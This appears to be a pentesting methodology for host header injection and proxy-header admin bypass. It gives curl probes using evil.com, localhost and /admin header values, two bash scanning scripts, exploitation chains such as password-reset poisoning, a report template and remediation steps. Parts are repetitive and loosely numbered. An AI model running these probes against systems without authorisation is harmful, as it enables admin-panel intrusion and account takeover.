# Host Header Injection Testing Methodology

## Overview
Host header injection occurs when an application uses the Host header (or related headers) without validation, allowing attackers to manipulate the host value used in application logic. This is a critical vulnerability class that can lead to full authentication bypass.

## Vulnerable Headers to Test

### Primary Headers
```
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
```

### Forwarded/Proxy Headers
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Forwarded-For: 127.0.0.1, 10.0.0.1
X-Forwarded-Proto: http
```

### Rewrite/Original Headers (Critical for Reverse Proxy Bypass)
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Original-Path: /admin
X-Envoy-Original-Path: /admin
X-Forwarded-Path: /admin
X-Original-Path-Info: /admin
```

### Custom/Framework-Specific Headers
```
X-Host: localhost
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 10.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
```

## Testing Methodology

### 1. Basic Host Header Injection
```bash
curl -H "Host: evil.com" https://target/
curl -H "X-Forwarded-Host: evil.com" https://target/
curl -H "X-Host: evil.com" https://target/
```

### 2. Admin Panel Bypass
```bash
# Test admin path access via rewrite headers
curl -H "X-Original-URL: /admin" https://target/
curl -H "X-Rewrite-URL: /admin" https://target/
curl -H "X-Envoy-Original-Path: /admin" https://target/
curl -H "X-Forwarded-Path: /admin" https://target/

# Test with localhost/127.0.0.1
curl -H "X-Forwarded-For: 127.0.0.1" https://target/
curl -H "X-Forwarded-Host: localhost" https://target/
curl -H "X-Forwarded-Host: 127.0.0.1" https://target/
```

### 3. Automated Testing Script
```bash
#!/bin/bash
TARGET="https://target.com"

headers=(
  "Host: evil.com"
  "X-Forwarded-Host: evil.com"
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-Host: localhost"
  "X-Original-URL: /admin"
  "X-Rewrite-URL: /admin"
  "X-Envoy-Original-Path: /admin"
  "X-Forwarded-Path: /admin"
  "X-Forwarded-Path: /admin/"
  "X-Forwarded-Host: evil.com"
  "X-Host: localhost"
  "X-Real-IP: 127.0.0.1"
  "X-Forwarded-For: 127.0.0.1, 10.0.0.1"
  "X-Custom-IP-Authorization: 127.0.0.1"
)

for hdr in "${headers[@]}"; do
  r=$(curl -s -H "$hdr" -w "\n%{http_code}" "https://target.com/")
  if echo "$r" | grep -qi "admin\|dashboard\|panel\|manage\|settings\|role\|permission"; then
    echo "[+] ADMIN CONTENT with: $hdr"
  fi
done
```

### 3. Content Comparison
```bash
# Compare normal vs bypass response
curl -s https://target/ > normal.html
curl -s -H "X-Forwarded-For: 127.0.0.1" https://target/ > bypass.html
diff -u normal.html bypass.html | grep "^+" | head -20
```

## Admin Panel Keywords to Detect
```
admin, dashboard, panel, manage, management, console, settings,
configuration, user management, role, permission, logout, sign out,
administrator, administration, control panel, admin panel,
user management, user admin, admin panel, admin dashboard
```

## Detection Signals

### Positive Signals (Vulnerable)
- Response contains admin keywords
- Response length significantly different
- New links/forms for admin functions
- Redirect to admin path
- Status 200 with admin content

### Negative Signals (Not Vulnerable)
- Same response as normal
- 403/401/404
- Redirect to login
- No admin keywords

## Exploitation Chains

### Chain 1: Full Admin Takeover
```
1. Host header injection → Admin panel access
2. Create admin user / modify permissions
3. Full system compromise
```

### Chain 2: Password Reset Poisoning
```
1. Host header injection on password reset
2. Reset link sent to attacker-controlled domain
3. Account takeover
```

### Chain 3: Cache Poisoning
```
1. Host header injection on cacheable page
2. Cache stores attacker-controlled content
3. All users see malicious content
```

## Testing Checklist

- [ ] Basic Host header
- [ ] X-Forwarded-Host
- [ ] X-Host
- [ ] X-Forwarded-For (IP spoofing)
- [ ] X-Forwarded-Host (domain)
- [ ] X-Original-URL
- [ ] X-Rewrite-URL
- [ ] X-Envoy-Original-Path
- [ ] X-Forwarded-Path
- [ ] X-Original-Path
- [ ] X-Original-Path-Info
- [ ] X-Forwarded-Host (evil.com)
- [ ] X-Forwarded-For (127.0.0.1)
- [ ] X-Forwarded-For (multiple IPs)
- [ ] X-Forwarded-Host (localhost)
- [ ] X-Host (localhost)
- [ ] X-Real-IP
- [ ] X-Forwarded-For (multiple)
- [ ] X-Custom-IP-Authorization

## Automated Testing Script

```bash
#!/bin/bash
TARGET="$1"
if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target>"
  exit 1
fi

headers=(
  "Host: evil.com"
  "X-Forwarded-Host: evil.com"
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-Host: localhost"
  "X-Original-URL: /admin"
  "X-Rewrite-URL: /admin"
  "X-Envoy-Original-Path: /admin"
  "X-Forwarded-Path: /admin"
  "X-Forwarded-Path: /admin/"
  "X-Forwarded-Host: evil.com"
  "X-Host: localhost"
  "X-Real-IP: 127.0.0.1"
  "X-Forwarded-For: 127.0.0.1, 10.0.0.1"
  "X-Custom-IP-Authorization: 127.0.0.1"
)

echo "Testing host header injection on $TARGET"
echo "========================================"

for hdr in "${headers[@]}"; do
  hdr_name=$(echo "$hdr" | cut -d: -f1)
  hdr_val=$(echo "$hdr" | cut -d: -f2- | xargs)
  
  r=$(curl -s -H "$hdr" -w "\n%{http_code}" "$TARGET")
  status=$(echo "$r" | tail -1)
  body=$(echo "$r" | head -n -1)
  
  # Check for admin content
  if echo "$body" | grep -qi "admin\|dashboard\|panel\|manage\|settings\|role\|permission\|logout\|sign out"; then
    echo "[+] ADMIN CONTENT with $hdr_name: $hdr_val (Status: $status)"
    echo "$body" | grep -i "admin\|dashboard\|panel" | head -5
  elif [ "$status" = "200" ]; then
    echo "[?] 200 OK with $hdr_name: $hdr_val (no admin keywords)"
  else
    echo "[-] $status with $hdr_name: $hdr_val"
  fi
done
```

## Common Frameworks/Proxy Behaviors

### Nginx
```
proxy_set_header Host $host;
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_set_header X-Forwarded-Proto $scheme;
```

### Apache
```
ProxyPreserveHost On
RequestHeader set X-Forwarded-Proto "https"
```

### Cloudflare
```
CF-Connecting-IP
X-Forwarded-For
X-Forwarded-Proto
CF-Ray
```

### AWS ALB
```
X-Forwarded-For
X-Forwarded-Proto
X-Forwarded-Port
Host
```

### Envoy
```
X-Envoy-Original-Path
X-Envoy-Original-Path-Info
X-Forwarded-Path
```

## Salesforce Community Specific

Salesforce Experience Cloud behind CDN (Akamai/Cloudflare) often has:
- Akamai edgekey.net CNAMEs
- Multiple proxy layers
- X-Forwarded-For chain
- Custom Salesforce headers

## Reporting Template

### Title
Host Header Injection → Admin Panel Bypass on [Target]

### Severity
Critical (CVSS 9.8)

### Description
The application trusts the Host header (or related headers) without validation, allowing an attacker to inject arbitrary host values and bypass authentication to access admin panels.

### Proof of Concept
```bash
curl -H "X-Forwarded-For: 127.0.0.1" https://target/
# Returns admin panel content
```

### Impact
- Full admin panel access
- User management
- Configuration changes
- Data exfiltration

### Remediation
1. Validate Host header against allowlist
2. Use `Host` header from TLS SNI
3. Don't trust X-Forwarded-* headers for security decisions
3. Configure reverse proxy to reject invalid hosts
3. Use canonical host validation

## References
- PortSwigger: Host Header Injection
- OWASP Host Header Attack
- ACME Security: Host Header Attack Case Study
- Nginx/Apache/Cloudflare documentation on Host header handling